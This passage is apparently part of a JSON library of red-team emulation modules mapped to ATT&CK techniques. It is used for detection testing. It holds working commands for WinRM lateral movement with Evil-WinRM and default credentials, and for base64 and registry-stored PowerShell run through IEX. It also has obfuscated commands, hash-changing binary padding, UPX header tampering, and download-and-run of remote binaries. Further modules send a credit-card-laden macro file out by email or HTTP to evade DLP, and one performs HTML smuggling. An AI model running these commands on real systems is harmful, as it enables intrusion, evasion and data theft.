      "technique_name": "Remote Services: Windows Remote Management",
      "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Enable-PSRemoting -Force\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9059e8de-3d7d-4954-a322-46161880b9cf",
      "module_name": "Enable Windows Remote Management"
    },
    {
      "index": 131,
      "technique_id": "T1021.006",
      "technique_name": "Remote Services: Windows Remote Management",
      "description": "Simulate lateral movement with PowerShell Remoting on the local host. \nUpon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the \nlocal machine as remote target.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Enable-PSRemoting -Force\nInvoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}",
        "elevation_required": false,
        "cleanup_command": "Disable-PSRemoting -Force"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5295bd61-bd7e-4744-9d52-85962a4cf2d6",
      "module_name": "Remote Code Execution with PS Credentials Using Invoke-Command"
    },
    {
      "index": 132,
      "technique_id": "T1021.006",
      "technique_name": "Remote Services: Windows Remote Management",
      "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "evil-winrm -i #{destination_address} -u #{user_name} -p #{password}",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user_name",
          "description": "Username",
          "type": "string",
          "default_value": "Domain\\Administrator"
        },
        {
          "name": "destination_address",
          "description": "Remote Host IP or Hostname",
          "type": "string",
          "default_value": "Target"
        },
        {
          "name": "password",
          "description": "Password",
          "type": "string",
          "default_value": "P@ssw0rd1"
        }
      ],
      "prerequisites": [
        {
          "description": "Computer must have Ruby Installed",
          "check_command": "try {if (ruby -v) {exit 0} else {exit 1}} catch {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest  -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\rubyinstaller-2.7.1-1-x64.exe\" https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe\n$file1= \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\rubyinstaller-2.7.1-1-x64.exe\"\nStart-Process $file1 /S;"
        },
        {
          "description": "Computer must have Evil-WinRM installed",
          "check_command": "try {if (evil-winrm -h) {exit 0} else {exit 1}} catch {exit 1}",
          "install_command": "gem install evil-winrm"
        }
      ],
      "rx_module_id": "efe86d95-44c4-4509-ae42-7bfd9d1f5b3d",
      "module_name": "WinRM Access with Evil-WinRM"
    },
    {
      "index": 133,
      "technique_id": "T1025",
      "technique_name": "Data from Removable Media",
      "description": "This test simulates an attack where PowerShell is used to detect connected USB or other removable storage devices and gather a list of specific document files \n(e.g., .docx, .xls, .txt, .pdf). The command works by first identifying removable drives on the system and then recursively searching through each one for files \nmatching the targeted extensions. If no removable drives are present, the script will return a message stating that no media is detected. This behavior mimics \nhow adversaries might scan for sensitive documents on removable devices for exfiltration or analysis.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "powershell.exe -c \"Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0b29f7e3-a050-44b7-bf05-9fb86af1ec2e",
      "module_name": "Identify Documents on USB and Removable Media via PowerShell"
    },
    {
      "index": 134,
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the RAGLOX Threat Library` \nand uname -v\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"b64decode -r\"; else cmd=\"base64 -d\"; fi;\ncat /tmp/encoded.dat | $cmd > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n",
        "elevation_required": false,
        "cleanup_command": "rm /tmp/encoded.dat \nrm /tmp/art.sh\n"
      },
      "variables": [
        {
          "name": "shell_command",
          "description": "command to encode",
          "type": "string",
          "default_value": "echo Hello from the RAGLOX Threat Library && uname -v"
        }
      ],
      "prerequisites": [
        {
          "description": "encode the command into base64 file\n",
          "check_command": "if [ -e \"/tmp/encoded.dat\" ]; then exit 0; else exit 1; fi\n",
          "install_command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"b64encode -r -\"; else cmd=\"base64\"; fi;\necho \"#{shell_command}\" | $cmd > /tmp/encoded.dat\n"
        }
      ],
      "rx_module_id": "f45df6be-2e1e-4136-a384-8f18ab3826fb",
      "module_name": "Decode base64 Data into Script"
    },
    {
      "index": 135,
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, RAGLOX!\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "powershell_command",
          "description": "PowerShell command to encode",
          "type": "string",
          "default_value": "Write-Host \"Hey, RAGLOX!\""
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a50d5a97-2531-499e-a1de-5544c74432c6",
      "module_name": "Execute base64-encoded PowerShell"
    },
    {
      "index": 136,
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}\n"
      },
      "variables": [
        {
          "name": "registry_key_storage",
          "description": "Windows Registry Key to store code",
          "type": "string",
          "default_value": "HKCU:Software\\Microsoft\\Windows\\CurrentVersion"
        },
        {
          "name": "powershell_command",
          "description": "PowerShell command to encode",
          "type": "string",
          "default_value": "Write-Host \"Hey, RAGLOX!\""
        },
        {
          "name": "registry_entry_storage",
          "description": "Windows Registry entry to store code under key",
          "type": "string",
          "default_value": "Debug"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "450e7218-7915-4be4-8b9b-464a49eafcec",
      "module_name": "Execute base64-encoded PowerShell from Windows Registry"
    },
    {
      "index": 137,
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "description": "Mimic execution of compressed executable. When successfully executed, calculator.exe will open.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\"\n",
        "elevation_required": false,
        "cleanup_command": "taskkill /f /im calculator.exe >nul 2>nul\ntaskkill /f /im CalculatorApp.exe >nul 2>nul\n"
      },
      "variables": [
        {
          "name": "url_path",
          "description": "url to download Exe",
          "type": "url",
          "default_value": "https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1027/bin/T1027.zip"
        }
      ],
      "prerequisites": [
        {
          "description": "T1027.exe must exist on disk at PathToRagloxModulesFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"#{url_path}\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1027.zip\"\nExpand-Archive -path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1027.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\temp_T1027.zip\\\" -Force\n"
        }
      ],
      "rx_module_id": "f8c8a909-5f29-49ac-9244-413936ce6d1f",
      "module_name": "Execution from Compressed File"
    },
    {
      "index": 138,
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_RAGLOX_Test' -Attachments \"#{input_file}\" -SmtpServer #{smtp_server}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Path of the XLSM file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1027\\src\\T1027-cc-macro.xlsm"
        },
        {
          "name": "sender",
          "description": "sender email",
          "type": "string",
          "default_value": "test@corp.com"
        },
        {
          "name": "receiver",
          "description": "receiver email",
          "type": "string",
          "default_value": "test@corp.com"
        },
        {
          "name": "smtp_server",
          "description": "SMTP Server IP Address",
          "type": "string",
          "default_value": "127.0.0.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "129edb75-d7b8-42cd-a8ba-1f3db64ec4ad",
      "module_name": "DLP Evasion via Sensitive Data in VBA Macro over email"
    },
    {
      "index": 139,
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-WebRequest -Uri #{ip_address} -Method POST -Body \"#{input_file}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Path of the XLSM file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1027\\src\\T1027-cc-macro.xlsm"
        },
        {
          "name": "ip_address",
          "description": "Destination IP address",
          "type": "string",
          "default_value": "127.0.0.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e2d85e66-cb66-4ed7-93b1-833fc56c9319",
      "module_name": "DLP Evasion via Sensitive Data in VBA Macro over HTTP"
    },
    {
      "index": 140,
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "description": "This is an obfuscated PowerShell command which when executed prints \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8b3f4ed6-077b-4bdd-891c-2d237f19410f",
      "module_name": "Obfuscated Command in PowerShell"
    },
    {
      "index": 141,
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "description": "This is an obfuscated certutil command that when executed downloads a file from the web. Adapted from T1105. Obfuscation includes special options chars (unicode hyphens), character substitution (e.g. ) and character insertion (including the usage of the right-to-left 0x202E and left-to-right 0x202D override characters).\nReference:\nhttps://wietze.github.io/blog/windows-command-line-obfuscation\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_file",
          "description": "URL of file to download",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/LICENSE.txt"
        },
        {
          "name": "local_path",
          "description": "Local path/filename to save the downloaded file to",
          "type": "path",
          "default_value": "RAGLOX-license.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e68b945c-52d0-4dd9-a5e8-d173d70c448f",
      "module_name": "Obfuscated Command Line using special Unicode characters"
    },
    {
      "index": 142,
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "description": "The following RX Module will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign and is later decrypted by Snake's kernel driver.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \"File created: $($file.FullName)\"\n",
        "elevation_required": true,
        "cleanup_command": "$fileNameToDelete = '04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog'; $filePathToDelete = \"$env:windir\\registration\\\"; $fullPathToDelete = Join-Path $filePathToDelete $fileNameToDelete; if (Test-Path $fullPathToDelete) { Remove-Item -Path $fullPathToDelete -Force; Write-Host \"File deleted: $fullPathToDelete\" } else { Write-Host \"File not found: $fullPathToDelete\" }\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7e47ee60-9dd1-4269-9c4f-97953b183268",
      "module_name": "Snake Malware Encrypted crmlog file"
    },
    {
      "index": 143,
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "description": "Mimic execution of compressed JavaScript file. When successfully executed, calculator.exe will open. This test is meant to help emulate Gootloader as per https://redcanary.com/blog/gootloader/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\"\n",
        "elevation_required": false,
        "cleanup_command": "taskkill /f /im calculator.exe >nul 2>nul\n"
      },
      "variables": [
        {
          "name": "url_path",
          "description": "url to download JScript file",
          "type": "url",
          "default_value": "https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1027/bin/t1027js.zip"
        }
      ],
      "prerequisites": [
        {
          "description": "T1027.js must exist on disk at PathToRagloxModulesFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"#{url_path}\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1027js.zip\"\nExpand-Archive -path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1027js.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\\" -Force\n"
        }
      ],
      "rx_module_id": "fad04df1-5229-4185-b016-fb6010cd87ac",
      "module_name": "Execution from Compressed JScript File"
    },
    {
      "index": 144,
      "technique_id": "T1027.001",
      "technique_name": "Obfuscated Files or Information: Binary Padding",
      "description": "Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes\ndd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data\ndd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data\n",
        "elevation_required": false,
        "cleanup_command": "rm #{file_to_pad}\n"
      },
      "variables": [
        {
          "name": "file_to_pad",
          "description": "Path of binary to be padded",
          "type": "path",
          "default_value": "/tmp/evil-binary"
        }
      ],
      "prerequisites": [
        {
          "description": "The binary must exist on disk at specified location (#{file_to_pad})\n",
          "check_command": "if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "cp /bin/ls #{file_to_pad}\n"
        }
      ],
      "rx_module_id": "ffe2346c-abd5-4b45-a713-bf5f1ebd573a",
      "module_name": "Pad Binary to Change Hash - Linux/macOS dd"
    },
    {
      "index": 145,
      "technique_id": "T1027.001",
      "technique_name": "Obfuscated Files or Information: Binary Padding",
      "description": "Uses truncate to add a byte to the binary to change the hash.\n\nUpon successful execution, truncate will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "truncate -s +1 #{file_to_pad} #adds a byte to the file size\n",
        "elevation_required": false,
        "cleanup_command": "rm #{file_to_pad}\n"
      },
      "variables": [
        {
          "name": "file_to_pad",
          "description": "Path of binary to be padded",
          "type": "path",
          "default_value": "/tmp/evil-binary"
        }
      ],
      "prerequisites": [
        {
          "description": "The binary must exist on disk at specified location (#{file_to_pad})\n",
          "check_command": "if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "cp /bin/ls #{file_to_pad}\n"
        }
      ],
      "rx_module_id": "e22a9e89-69c7-410f-a473-e6c212cd2292",
      "module_name": "Pad Binary to Change Hash using truncate command - Linux/macOS"
    },
    {
      "index": 146,
      "technique_id": "T1027.002",
      "technique_name": "Obfuscated Files or Information: Software Packing",
      "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n",
        "elevation_required": false,
        "cleanup_command": "rm /tmp/packed_bin\n"
      },
      "variables": [
        {
          "name": "bin_path",
          "description": "Packed binary",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1027.002/bin/linux/test_upx"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "11c46cd8-e471-450e-acb8-52a1216ae6a4",
      "module_name": "Binary simply packed by UPX (linux)"
    },
    {
      "index": 147,
      "technique_id": "T1027.002",
      "technique_name": "Obfuscated Files or Information: Software Packing",
      "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n",
        "elevation_required": false,
        "cleanup_command": "rm /tmp/packed_bin\n"
      },
      "variables": [
        {
          "name": "bin_path",
          "description": "Packed binary",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1027.002/bin/linux/test_upx_header_changed"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f06197f8-ff46-48c2-a0c6-afc1b50665e1",
      "module_name": "Binary packed by UPX, with modified headers (linux)"
    },
    {
      "index": 148,
      "technique_id": "T1027.002",
      "technique_name": "Obfuscated Files or Information: Software Packing",
      "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n",
        "elevation_required": false,
        "cleanup_command": "rm /tmp/packed_bin\n"
      },
      "variables": [
        {
          "name": "bin_path",
          "description": "Packed binary",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1027.002/bin/darwin/test_upx"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b16ef901-00bb-4dda-b4fc-a04db5067e20",
      "module_name": "Binary simply packed by UPX"
    },
    {
      "index": 149,
      "technique_id": "T1027.002",
      "technique_name": "Obfuscated Files or Information: Software Packing",
      "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\n",
        "elevation_required": false,
        "cleanup_command": "rm /tmp/packed_bin\n"
      },
      "variables": [
        {
          "name": "bin_path",
          "description": "Packed binary",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1027.002/bin/darwin/test_upx_header_changed"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4d46e16b-5765-4046-9f25-a600d3e65e4d",
      "module_name": "Binary packed by UPX, with modified headers"
    },
    {
      "index": 150,
      "technique_id": "T1027.004",
      "technique_name": "Obfuscated Files or Information: Compile After Delivery",
      "description": "Compile C# code using csc.exe binary used by .NET\nUpon execution an exe named T1027.004.exe will be placed in the temp folder\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} \"#{input_file}\"\n",
        "elevation_required": false,
        "cleanup_command": "del #{output_file} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Output compiled binary",
          "type": "path",
          "default_value": "C:\\Windows\\Temp\\T1027.004.exe"
        },
        {
          "name": "input_file",
          "description": "C# code that launches calc.exe from a hidden cmd.exe Window",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1027.004\\src\\calc.cs"
        }
      ],
      "prerequisites": [
        {
          "description": "C# file must exist on disk at specified location (#{input_file})\n",
          "check_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1027.004/src/calc.cs\" -OutFile \"#{input_file}\"\n"
        }
      ],
      "rx_module_id": "ffcdbd6a-b0e8-487d-927a-09127fe9a206",
      "module_name": "Compile After Delivery using csc.exe"
    },
    {
      "index": 151,
      "technique_id": "T1027.004",
      "technique_name": "Obfuscated Files or Information: Compile After Delivery",
      "description": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is contained in the 'bin' folder of this raglox, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-Expression \"#{input_file}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "exe program containing dynamically compiled C# code",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "exe file must exist on disk at specified location (#{input_file})\n",
          "check_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1027.004/bin/T1027.004_DynamicCompile.exe -OutFile \"#{input_file}\"\n"
        }
      ],
      "rx_module_id": "453614d8-3ba6-4147-acc0-7ec4b3e1faef",
      "module_name": "Dynamic C# Compile"
    },
    {
      "index": 152,
      "technique_id": "T1027.004",
      "technique_name": "Obfuscated Files or Information: Compile After Delivery",
      "description": "Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "gcc #{input_file} && ./a.out\nclang #{input_file} && ./a.out\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "source file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1027.004/src/T1027-004-test.c"
        }
      ],
      "prerequisites": [
        {
          "description": "the source file must exist on disk at specified location (#{input_file})\n",
          "check_command": "if [ -e  #{input_file} ]; then exit 0; else exit 1; fi\n",
          "install_command": "wget https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1027.004/src/T1027-004-test.c -O \"#{input_file}\"\n"
        }
      ],
      "rx_module_id": "d0377aa6-850a-42b2-95f0-de558d80be57",
      "module_name": "C compile"
    },
    {
      "index": 153,
      "technique_id": "T1027.004",
      "technique_name": "Obfuscated Files or Information: Compile After Delivery",
      "description": "Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "g++ #{input_file} && ./a.out\nclang++ #{input_file} && ./a.out\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "source file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1027.004/src/T1027-004-test.cc"
        }
      ],
      "prerequisites": [
        {
          "description": "the source file must exist on disk at specified location (#{input_file})\n",
          "check_command": "if [ -e  #{input_file} ]; then exit 0; else exit 1; fi\n",
          "install_command": "wget https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1027.004/src/T1027-004-test.cc -O #{input_file}\n"
        }
      ],
      "rx_module_id": "da97bb11-d6d0-4fc1-b445-e443d1346efe",
      "module_name": "CC compile"
    },
    {
      "index": 154,
      "technique_id": "T1027.004",
      "technique_name": "Obfuscated Files or Information: Compile After Delivery",
      "description": "Compile a go file with golang on FreeBSD, Linux or Macos.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "go run #{input_file}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "source file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1027.004/src/T1027-004-test.go"
        }
      ],
      "prerequisites": [
        {
          "description": "the source file must exist on disk at specified location (#{input_file})\n",
          "check_command": "if [ -e  #{input_file} ]; then exit 0; else exit 1; fi\n",
          "install_command": "wget https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1027.004/src/T1027-004-test.go -O #{input_file}\n"
        }
      ],
      "rx_module_id": "78bd3fa7-773c-449e-a978-dc1f1500bc52",
      "module_name": "Go compile"
    },
    {
      "index": 155,
      "technique_id": "T1027.006",
      "technique_name": "HTML Smuggling",
      "description": "The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/raglox-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/rx_modules/T1553.005/bin/FeelTheBurn.iso) without user interaction. \nThe HTML file is based off of the work from [Stan Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "& \"PathToRagloxModulesFolder\\T1027.006\\bin\\T1027_006_remote.html\"\n",
        "elevation_required": false,
        "cleanup_command": "$user = [System.Environment]::UserName; Remove-Item -Path C:\\Users\\$user\\Downloads\\FeelTheBurn.iso -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [
        {
